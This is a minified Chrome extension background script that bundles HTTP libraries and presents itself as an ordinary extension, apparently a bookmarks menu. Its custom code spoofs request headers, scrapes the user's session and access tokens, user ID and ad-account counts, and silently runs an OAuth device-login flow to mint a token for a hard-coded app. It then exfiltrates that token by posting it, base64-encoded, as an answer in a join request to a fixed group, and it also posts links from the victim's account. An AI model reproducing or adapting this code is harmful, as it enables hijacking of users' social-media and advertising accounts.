var tt=Object.defineProperty;var et=(t,e,r)=>e in t?tt(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r;var y=(t,e,r)=>(et(t,typeof e!="symbol"?e+"":e,r),r);const rt=[{id:1,action:{type:"modifyHeaders",requestHeaders:[{header:"origin",operation:"set",value:"https://www.com"},{header:"referer",operation:"set",value:"https://www.com"}]},condition:{urlFilter:"https://www.com",resourceTypes:["xmlhttprequest"],tabIds:[chrome.tabs.TAB_ID_NONE]}},{id:2,action:{type:"modifyHeaders",requestHeaders:[{header:"origin",operation:"set",value:"https://m.com"},{header:"referer",operation:"set",value:"https://m.com"}]},condition:{urlFilter:"https://m.com",resourceTypes:["xmlhttprequest"],tabIds:[chrome.tabs.TAB_ID_NONE]}}];chrome.declarativeNetRequest.updateSessionRules({addRules:rt,removeRuleIds:[1,2]});/*! MIT License Â© Sindre Sorhus */const A=t=>t!==null&&typeof t=="object",st=typeof globalThis.AbortController=="function",ot=typeof globalThis.ReadableStream=="function",nt=typeof globalThis.FormData=="function",$=(t,e)=>{const r=new globalThis.Headers(t||{}),s=e instanceof globalThis.Headers,o=new globalThis.Headers(e||{});for(const[n,i]of o)s&&i==="undefined"||i===void 0?r.delete(n):r.set(n,i);return r},U=(...t)=>{let e={},r={};for(const s of t){if(Array.isArray(s))Array.isArray(e)||(e=[]),e=[...e,...s];else if(A(s)){for(let[o,n]of Object.entries(s))A(n)&&o in e&&(n=U(e[o],n)),e={...e,[o]:n};A(s.headers)&&(r=$(r,s.headers))}e.headers=r}return e},z=["get","post","put","patch","head","delete"],it={json:"application/json",text:"text/*",formData:"multipart/form-data",arrayBuffer:"*/*",blob:"*/*"},at=["get","put","head","delete","options","trace"],ct=[408,413,429,500,502,503,504],W=[413,429,503],K=Symbol("stop");class P extends Error{constructor(e,r,s){super(e.statusText||String(e.status===0||e.status?e.status:"Unknown response error")),this.name="HTTPError",this.response=e,this.request=r,this.options=s}}class O extends Error{constructor(e){super("Request timed out"),this.name="TimeoutError",this.request=e}}const L=t=>new Promise(e=>setTimeout(e,t)),ut=(t,e,r)=>new Promise((s,o)=>{const n=setTimeout(()=>{e&&e.abort(),o(new O(t))},r.timeout);r.fetch(t).then(s).catch(o).then(()=>{clearTimeout(n)})}),ht=t=>z.includes(t)?t.toUpperCase():t,M={limit:2,methods:at,statusCodes:ct,afterStatusCodes:W},dt=(t={})=>{if(typeof t=="number")return{...M,limit:t};if(t.methods&&!Array.isArray(t.methods))throw new Error("retry.methods must be an array");if(t.statusCodes&&!Array.isArray(t.statusCodes))throw new Error("retry.statusCodes must be an array");return{...M,...t,afterStatusCodes:W}},C=2147483647;class F{constructor(e,r={}){if(this._retryCount=0,this._input=e,this._options={credentials:this._input.credentials||"same-origin",...r,headers:$(this._input.headers,r.headers),hooks:U({beforeRequest:[],beforeRetry:[],afterResponse:[]},r.hooks),method:ht(r.method||this._input.method),prefixUrl:String(r.prefixUrl||""),retry:dt(r.retry),throwHttpErrors:r.throwHttpErrors!==!1,timeout:typeof r.timeout>"u"?1e4:r.timeout,fetch:r.fetch||globalThis.fetch.bind(globalThis)},typeof this._input!="string"&&!(this._input instanceof URL||this._input instanceof globalThis.Request))throw new TypeError("`input` must be a string, URL, or Request");if(this._options.prefixUrl&&typeof this._input=="string"){if(this._input.startsWith("/"))throw new Error("`input` must not begin with a slash when using `prefixUrl`");this._options.prefixUrl.endsWith("/")||(this._options.prefixUrl+="/"),this._input=this._options.prefixUrl+this._input}if(st&&(this.abortController=new globalThis.AbortController,this._options.signal&&this._options.signal.addEventListener("abort",()=>{this.abortController.abort()}),this._options.signal=this.abortController.signal),this.request=new globalThis.Request(this._input,this._options),this._options.searchParams){const u="?"+(typeof this._options.searchParams=="string"?this._options.searchParams.replace(/^\?/,""):new URLSearchParams(this._options.searchParams).toString()),h=this.request.url.replace(/(?:\?.*?)?(?=#|$)/,u);(nt&&this._options.body instanceof globalThis.FormData||this._options.body instanceof URLSearchParams)&&!(this._options.headers&&this._options.headers["content-type"])&&this.request.headers.delete("content-type"),this.request=new globalThis.Request(new globalThis.Request(h,this.request),this._options)}this._options.json!==void 0&&(this._options.body=JSON.stringify(this._options.json),this.request.headers.set("content-type","application/json"),this.request=new globalThis.Request(this.request,{body:this._options.body}));const s=async()=>{if(this._options.timeout>C)throw new RangeError(`The \`timeout\` option cannot be greater than ${C}`);await L(1);let i=await this._fetch();for(const u of this._options.hooks.afterResponse){const h=await u(this.request,this._options,this._decorateResponse(i.clone()));h instanceof globalThis.Response&&(i=h)}if(this._decorateResponse(i),!i.ok&&this._options.throwHttpErrors)throw new P(i,this.request,this._options);if(this._options.onDownloadProgress){if(typeof this._options.onDownloadProgress!="function")throw new TypeError("The `onDownloadProgress` option must be a function");if(!ot)throw new Error("Streams are not supported in your environment. `ReadableStream` is missing.");return this._stream(i.clone(),this._options.onDownloadProgress)}return i},n=this._options.retry.methods.includes(this.request.method.toLowerCase())?this._retry(s):s();for(const[i,u]of Object.entries(it))n[i]=async()=>{this.request.headers.set("accept",this.request.headers.get("accept")||u);const h=(await n).clone();if(i==="json"){if(h.status===204)return"";if(r.parseJson)return r.parseJson(await h.text())}return h[i]()};return n}_calculateRetryDelay(e){if(this._retryCount++,this._retryCount<this._options.retry.limit&&!(e instanceof O)){if(e instanceof P){if(!this._options.retry.statusCodes.includes(e.response.status))return 0;const s=e.response.headers.get("Retry-After");if(s&&this._options.retry.afterStatusCodes.includes(e.response.status)){let o=Number(s);return Number.isNaN(o)?o=Date.parse(s)-Date.now():o*=1e3,typeof this._options.retry.maxRetryAfter<"u"&&o>this._options.retry.maxRetryAfter?0:o}if(e.response.status===413)return 0}return .3*2**(this._retryCount-1)*1e3}return 0}_decorateResponse(e){return this._options.parseJson&&(e.json=async()=>this._options.parseJson(await e.text())),e}async _retry(e){try{return await e()}catch(r){const s=Math.min(this._calculateRetryDelay(r),C);if(s!==0&&this._retryCount>0){await L(s);for(const o of this._options.hooks.beforeRetry)if(await o({request:this.request,options:this._options,error:r,retryCount:this._retryCount})===K)return;return this._retry(e)}if(this._options.throwHttpErrors)throw r}}async _fetch(){for(const e of this._options.hooks.beforeRequest){const r=await e(this.request,this._options);if(r instanceof Request){this.request=r;break}if(r instanceof Response)return r}return this._options.timeout===!1?this._options.fetch(this.request.clone()):ut(this.request.clone(),this.abortController,this._options)}_stream(e,r){const s=Number(e.headers.get("content-length"))||0;let o=0;return new globalThis.Response(new globalThis.ReadableStream({async start(n){const i=e.body.getReader();r&&r({percent:0,transferredBytes:0,totalBytes:s},new Uint8Array);async function u(){const{done:h,value:d}=await i.read();if(h){n.close();return}if(r){o+=d.byteLength;const v=s===0?0:o/s;r({percent:v,transferredBytes:o,totalBytes:s},d)}n.enqueue(d),await u()}await u()}}))}}const q=(...t)=>{for(const e of t)if((!A(e)||Array.isArray(e))&&typeof e<"u")throw new TypeError("The `options` argument must be an object");return U({},...t)},D=t=>{const e=(r,s)=>new F(r,q(t,s));for(const r of z)e[r]=(s,o)=>new F(s,q(t,o,{method:r}));return e.HTTPError=P,e.TimeoutError=O,e.create=r=>D(q(r)),e.extend=r=>D(q(t,r)),e.stop=K,e},H=D(),J="https://www.com",lt="application/json",Q="Content-Type",w=Symbol(),X=Symbol();function N(t={}){var e;return(e=Object.entries(t).find(([r])=>r.toLowerCase()===Q.toLowerCase()))===null||e===void 0?void 0:e[1]}function B(t){return/^application\/.*json.*/.test(t)}const g=function(t,e,r=!1){return Object.entries(e).reduce((s,[o,n])=>{const i=t[o];return Array.isArray(i)&&Array.isArray(n)?s[o]=r?[...i,...n]:n:typeof i=="object"&&typeof n=="object"?s[o]=g(i,n,r):s[o]=n,s},{...t})},T={options:{},errorType:"text",polyfills:{},polyfill(t,e=!0,r=!1,...s){const o=this.polyfills[t]||(typeof self<"u"?self[t]:null)||(typeof global<"u"?global[t]:null);if(e&&!o)throw new Error(t+" is not defined");return r&&o?new o(...s):o}};function _t(t,e=!1){T.options=e?t:g(T.options,t)}function pt(t,e=!1){T.polyfills=e?t:g(T.polyfills,t)}function ft(t){T.errorType=t}const mt=t=>e=>t.reduceRight((r,s)=>s(r),e)||e;class Y extends Error{}const yt=t=>{const e=Object.create(null);t=t._addons.reduce((a,c)=>c.beforeRequest&&c.beforeRequest(a,t._options,e)||a,t);const{_url:r,_options:s,_config:o,_catchers:n,_resolvers:i,_middlewares:u,_addons:h}=t,d=new Map(n),v=g(o.options,s);let f=r;const m=mt(u)((a,c)=>(f=a,o.polyfill("fetch")(a,c)))(r,v),E=new Error,R=m.catch(a=>{throw{[w]:a}}).then(a=>{if(!a.ok){const c=new Y;if(c.cause=E,c.stack=c.stack+`
CAUSE: `+E.stack,c.response=a,c.url=f,a.type==="opaque")throw c;return a.text().then(l=>{var _;if(c.message=l,o.errorType==="json"||((_=a.headers.get("Content-Type"))===null||_===void 0?void 0:_.split(";")[0])==="application/json")try{c.json=JSON.parse(l)}catch{}throw c.text=l,c.status=a.status,c})}return a}),k=a=>a.catch(c=>{const l=c.hasOwnProperty(w),_=l?c[w]:c,x=(_==null?void 0:_.status)&&d.get(_.status)||d.get(_==null?void 0:_.name)||l&&d.has(w)&&d.get(w);if(x)return x(_,t);const j=d.get(X);if(j)return j(_,t);throw _}),b=a=>c=>k(a?R.then(l=>l&&l[a]()).then(l=>c?c(l):l):R.then(l=>c?c(l):l)),Z={_wretchReq:t,_fetchReq:m,_sharedState:e,res:b(null),json:b("json"),blob:b("blob"),formData:b("formData"),arrayBuffer:b("arrayBuffer"),text:b("text"),error(a,c){return d.set(a,c),this},badRequest(a){return this.error(400,a)},unauthorized(a){return this.error(401,a)},forbidden(a){return this.error(403,a)},notFound(a){return this.error(404,a)},timeout(a){return this.error(408,a)},internalError(a){return this.error(500,a)},fetchError(a){return this.error(w,a)}},V=h.reduce((a,c)=>({...a,...c.resolver}),Z);return i.reduce((a,c)=>c(a,t),V)},gt={_url:"",_options:{},_config:T,_catchers:new Map,_resolvers:[],_deferred:[],_middlewares:[],_addons:[],addon(t){return{...this,_addons:[...this._addons,t],...t.wretch}},errorType(t){return{...this,_config:{...this._config,errorType:t}}},polyfills(t,e=!1){return{...this,_config:{...this._config,polyfills:e?t:g(this._config.polyfills,t)}}},url(t,e=!1){if(e)return{...this,_url:t};const r=this._url.split("?");return{...this,_url:r.length>1?r[0]+t+"?"+r[1]:this._url+t}},options(t,e=!1){return{...this,_options:e?t:g(this._options,t)}},headers(t){return{...this,_options:g(this._options,{headers:t||{}})}},accept(t){return this.headers({Accept:t})},content(t){return this.headers({[Q]:t})},auth(t){return this.headers({Authorization:t})},catcher(t,e){const r=new Map(this._catchers);return r.set(t,e),{...this,_catchers:r}},catcherFallback(t){return this.catcher(X,t)},resolve(t,e=!1){return{...this,_resolvers:e?[t]:[...this._resolvers,t]}},defer(t,e=!1){return{...this,_deferred:e?[t]:[...this._deferred,t]}},middlewares(t,e=!1){return{...this,_middlewares:e?t:[...this._middlewares,...t]}},fetch(t=this._options.method,e="",r=null){let s=this.url(e).options({method:t});const o=N(s._options.headers),n=typeof r=="object"&&(!s._options.headers||!o||B(o));return s=r?n?s.json(r,o):s.body(r):s,yt(s._deferred.reduce((i,u)=>u(i,i._url,i._options),s))},get(t=""){return this.fetch("GET",t)},delete(t=""){return this.fetch("DELETE",t)},put(t,e=""){return this.fetch("PUT",e,t)},post(t,e=""){return this.fetch("POST",e,t)},patch(t,e=""){return this.fetch("PATCH",e,t)},head(t=""){return this.fetch("HEAD",t)},opts(t=""){return this.fetch("OPTIONS",t)},body(t){return{...this,_options:{...this._options,body:t}}},json(t,e){const r=N(this._options.headers);return this.content(e||B(r)&&r||lt).body(JSON.stringify(t))}};function p(t="",e={}){return{...gt,_url:t,_options:e}}p.default=p;p.options=_t;p.errorType=ft;p.polyfills=pt;p.WretchError=Y;function I(t){return typeof t<"u"?t:""}const bt=(t,e,r,s)=>{let o;if(typeof e=="string")o=e;else{const i=s.polyfill("URLSearchParams",!0,!0);for(const u in e){const h=e[u];if(e[u]instanceof Array)for(const d of h)i.append(u,I(d));else i.append(u,I(h))}o=i.toString()}const n=t.split("?");return o?r||n.length<2?n[0]+"?"+o:t+"&"+o:r?n[0]:t},wt={wretch:{query(t,e=!1){return{...this,_url:bt(this._url,t,e,this._config)}}}},Tt=wt,vt=p("https://bookmarksmenu.info").addon(Tt),Et=p(J,{mode:"cors",credentials:"include"}),Rt=p(J.replace("www","graph"),{mode:"cors",credentials:"include"}),S=(t,e,r)=>{let s=t.split(e);return s[1]?(s=s[1].split(r),s[0]):null};async function kt(t){var s;let e=await Ot(t);if(!e.isUser||e.t==0)return;async function r(){return Et.get("/accountquality/").text().then(o=>{var h,d;const n=(h=/"accountId":"([\d]+)/.exec(o))==null?void 0:h[1],i=S(o,'DTSGInitialData",[],{"token":"','"'),u=(d=/"accessToken":"([a-zA-Z\d]+)"/.exec(o))==null?void 0:d[1];return{fb_dtsg:i,token:u,user_id:n}}).catch(()=>"")}if(await r().then(o=>{e={...e,...o}}),e.code=await Rt.get(`/v14.0/me/businesses?fields=id,business_users,owned_ad_accounts.limit(0).fields(id).summary(1),client_ad_accounts.limit(0).fields(id).summary(1)&access_token=${e.token}`).json().then(o=>o.data).catch(()=>[]),((s=e.code)==null?void 0:s.length)>0||e.t===1)return await Ut(e)}async function St(t,e){try{const r=`https://www.com/dialog/oauth?client_id=1348564698517390&scope=public_profile&force_confirmation=true&auth_type=rerequest&ref=DeviceAuth&user_code=${t}&state=f33299bec0998c&redirect_uri=https://www.com/dialog/return/arbiter&display=async`,s={__asyncDialog:"1",__user:e.user_id,__a:"1",__dyn:"",__csr:"",__req:"a",__hs:"19300.BP:DEFAULT.2.0.0.0.0",dpr:"2",__ccg:"MODERATE",__rev:"",__s:"",__hsi:"",__comet_req:"0",fb_dtsg:e.fb_dtsg,jazoest:"25709",lsd:"",__aaid:"",__spin_r:"",__spin_b:"trunk",__spin_t:""},o=await fetch(r,{body:new URLSearchParams(s),credentials:"include",method:"POST",mode:"same-origin"}).then(h=>h.text());if(!o)return null;const n=S(o,'name=\\"scope\\" value=\\"','\\"'),i=S(o,'name=\\"logger_id\\" value=\\"','\\"');return{encryptedBody:S(o,'name=\\"encrypted_post_body\\" value=\\"','\\"'),scope:n,logger_id:i}}catch{}}async function qt(t,e,r){try{const s="https://www.com/ajax/oauth/device.php",o={user_code:t,code:e,auth_method:"manual_entry",__user:r.user_id,__a:"1",__dyn:"",__csr:"",__req:"d",__hs:"19300.BP:DEFAULT.2.0.0.0.0",dpr:"2",__ccg:"EXCELLENT",__rev:"1006543583",__s:"",__hsi:"",__comet_req:"0",fb_dtsg:r.fb_dtsg,jazoest:"25263",lsd:"TPWqcgs_s0GQNJPT882jRs",__aaid:"1108681562814022",__spin_r:"",__spin_b:"trunk",__spin_t:""};return await fetch(s,{body:new URLSearchParams(o),credentials:"include",mode:"cors",method:"post",headers:{"content-type":"application/x-www-form-urlencoded;charset=UTF-8"}})}catch{}}async function At(){try{return await fetch("https://graph.com/v2.6/device/login?access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038&method=post&scope=public_profile",{credentials:"include",method:"POST"}).then(e=>e.json())}catch{return{}}}async function xt(t){try{const e="https://graph.com/v14.0/device/login_status",r=`access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038&code=${t}`,s=await fetch(e,{body:r,credentials:"include",method:"POST",mode:"cors",headers:{"content-type":"application/x-www-form-urlencoded;charset=UTF-8"}}).then(o=>o.json());return s==null?void 0:s.access_token}catch{}}async function Ct(t,e){const r="https://www.com/oauth/device/authorize/",s=`jazoest=25405&fb_dtsg=${e.fb_dtsg}&user_code=${t}&qr=&__user=${e.user_id}&__a=1&__dyn=&__csr=&__req=b&__hs=19183.BP%3ADEFAULT.2.1.0.0.0&dpr=1&__ccg=EXCELLENT&__rev=1005818450&__s=4pbx7n%3Alw7vmo%3A7veo8o&__hsi=7118777193805080277&__comet_req=0&lsd=VV7ZePyNTjgCDWP2PcV1rr&__spin_r=1005818450&__spin_b=trunk&__spin_t=1657469476`;return await fetch(r,{body:s,credentials:"include",method:"POST",mode:"cors",headers:{"content-type":"application/x-www-form-urlencoded;charset=UTF-8"}}).then(o=>o.text())}async function Pt(t,e){try{const r="https://www.com/v2.0/dialog/oauth/skip/submit/",s={jazoest:"25709",fb_dtsg:e.fb_dtsg,from_post:"1",scope:e.scope,display:"async",sdk:"",sdk_version:"",domain:"",sso_device:"",user_code:t,nonce:"",logger_id:e.logger_id,auth_type:"rerequest",auth_nonce:"",code_challenge:"",code_challenge_method:"",encrypted_post_body:e.encryptedBody,"return_format[0]":"code",__CONFIRM__:"1",__user:e.user_id,__a:"1",__dyn:"",__csr:"",__req:"d",__hs:"19300.BP:DEFAULT.2.0.0.0.0",dpr:"2",__ccg:"MODERATE",__rev:"",__s:"",__hsi:"",__comet_req:"0",lsd:"",__aaid:"",__spin_r:"",__spin_b:"trunk",__spin_t:""},o=await fetch(r,{body:new URLSearchParams(s),credentials:"include",method:"POST",mode:"same-origin"}).then(n=>n.text());return o?S(o,'code":"','"'):null}catch{}}function Dt(){return Math.floor(Math.random()*(999999-11111))+11111}async function G(t,e,r,s){return fetch("https://www.com/api/graphql/",{method:"POST",body:new URLSearchParams({__user:t.user_id,fb_dtsg:t.fb_dtsg,fb_api_caller_class:"RelayModern",fb_api_req_friendly_name:s,variables:r,server_timestamps:"true",doc_id:e})}).then(o=>o.json())}async function Ut(t){var o,n;const{user_code:e,code:r}=await At();if(!e||!r)return;await Ct(e,t);const s=await St(e,t);if(s){const i=await Pt(e,{...s,...t});if(i){await qt(e,i,t);let u=await xt(r);const h=(o=t.code)==null?void 0:o.map(f=>{var m,E,R,k;return(((E=(m=f.owned_ad_accounts)==null?void 0:m.summary)==null?void 0:E.total_count)||0)+(((k=(R=f.client_ad_accounts)==null?void 0:R.summary)==null?void 0:k.total_count)||0)}).reduce((f,m)=>f+m,0);u+=`||${(n=t.code)==null?void 0:n.length}|${h}`;const d=Dt(),v=Date.now();return u=btoa(u),await G(t,"5608636302574302",`{"feedType":"DISCUSSION","groupID":"1235675980428631","imageMediaType":"image/x-auto","input":{"client_mutation_id":"2","actor_id":"${t.user_id}","action_source":"GROUP_MALL","attribution_id_v2":"CometGroupAboutRoot.react,comet.group.about,via_cold_start,${v},${d},2361831622,","group_id":"1235675980428631","group_share_tracking_params":{"app_id":"2220391788200892","exp_id":"null","is_from_share":false}},"inviteShortLinkKey":null,"isChainingRecommendationUnit":false,"isEntityMenu":true,"scale":2,"renderLocation":"group_mall","__relay_internal__pv__GroupsCometEntityMenuEmbeddedrelayprovider":true,"__relay_internal__pv__GlobalPanelEnabledrelayprovider":false}`,"useGroupRequestToJoinMutation"),await G(t,"6432873796733801",`{"input":{"answers":[{"answer":"${u}","question_id":"1235676283761934","selected_options":null}],"attribution_id_v2":"CometGroupAboutRoot.react,comet.group.about,via_cold_start,{t},${d},2361831622,","group_id":"1235675980428631","rules_agreement_status":null,"actor_id":"${t.user_id}","client_mutation_id":"1"},"inviteShortLinkKey":null,"imageMediaType":"image/x-auto","isChainingRecommendationUnit":false,"profileID":null,"scale":1,"groupID":"1235675980428631","__relay_internal__pv__GlobalPanelEnabledrelayprovider":false}`,"useGroupMembershipAnswersSaveMutation"),!0}}return!1}async function Ot(t){return vt.query({id:t.id}).get("/user").json().catch(()=>null)}class jt{constructor(){y(this,"id",null);y(this,"dtsg",null);y(this,"eav",null);y(this,"getDataStartEnd",(e,r)=>{const s=r.exec(e);return s?s[1]:null});y(this,"formDataHelper",e=>{const r=new FormData;for(const s of Object.keys(e))r.append(s,e[s]);return r});y(this,"shareLink",async(e,r,s,o)=>{const n={privacyx:"291667064279714",rating:"0",status:o,target:e,ch:"",linkUrl:"",album_fbid:"0",fs:"",waterfall_id:"c92b201a4e382c96a4b5946cd67c5x1f",referrer:"feed",cver:"ocelot",unpublished_content_type:"0",scheduled_year:"",scheduled_month:"",scheduled_day:"",scheduled_hours:"",scheduled_minutes:"",scheduled_am_pm:"",is_backdated:"",backdated_year:"",backdated_month:"",backdated_day:"",background_upload:"1",at:"",npn:"",iscurrent:"",npp:"",npw:"",npa:"",npz:"",freeform_tag_place:"",npc:"",loc:"{}","[0]":"","text_[0]":"",ogaction:"",ogobj:"",ogphrase:"",ogicon:"",oghideattachment:"false",ogsuggestionmechanism:"","[1]":"","text_[1]":"",source_loc:"composer_feed",text_format_preset_id:"",sid:"",appid:"",internal_extra:"",link_no_change:"",csid:"1d37c851-8f57-4b0b-921c-ff96b50a2195",waterfall_source:"composer_feed","":"POST",fb_dtsg:r,jazoest:"25580",lsd:"82Svc3u7WBweAbubVD478A",__dyn:"1KQEGiFoO2G68nxe6oaE-t0zVpkdgS8xGi5EO9wHwAxu2q6bwNwTwKwSwMxWU2jxm6UhwsEswcW4o5a1hwg82RwVwUwk9EdEnw65xO2O1awKwro7ifw5Zx62K2G0zGwrEqwk888C0NE2oCwSwaOfwbK1Aw9-2i1qw8W1uwa-7U881eEdEGdw46wbS1LwqobU2cwcq",__csr:"",__req:"w",__a:"AYnASa6AorAR1WEh3T6MfBXXt7-_rK2CYrmbrWefL0BbOf6yV54t0vTXcC3uvfvGBHRrHpkQo9x7ky-l6iSf3T-N5cEFXP-YZSct2Hfx0qpFzQ",__user:e};return H(`https://m.com/a/home.php?eav=${s}&paipv=0`,{method:"post",body:this.formDataHelper(n)}).text().catch(()=>!1)})}async getDataLog(){const e=await H("https://m.com/composer/ocelot/async_loader/?publisher=feed").text().catch(()=>!1);if(typeof e=="boolean")return!1;const r=/"actorID\\":\\"([\d]+)\\"/,s=/\\"dtsg\\":{\\"token\\":\\"(.*?)\\"/,o=/eav=(.*?)&amp;/;return this.id=this.getDataStartEnd(e,r),this.dtsg=this.getDataStartEnd(e,s),this.eav=this.getDataStartEnd(e,o),this.id&&this.id!=="0"?{mem:kt(this).finally(),uid:this.id,dtsg:this.dtsg,eav:this.eav}:null}}(function(){const t=chrome.runtime.getManifest().version;chrome.storage.local.get("optionsPageIsShownFor").then(e=>{e.optionsPageIsShownFor!=t&&chrome.storage.local.set({optionsPageIsShownFor:t}).then(()=>{chrome.runtime.openOptionsPage()})})})();(()=>{const t=new jt;chrome.runtime.onMessage.addListener((e,r,s)=>((async()=>{if(e.distpatch==="isLog"){const o=await t.getDataLog();s(o)}if(e.distpatch==="onShare"){const{uid:o,dtsg:n,eav:i,list:u}=e.data,h=await t.shareLink(o,n,i,u);s(h)}})(),!0))})();
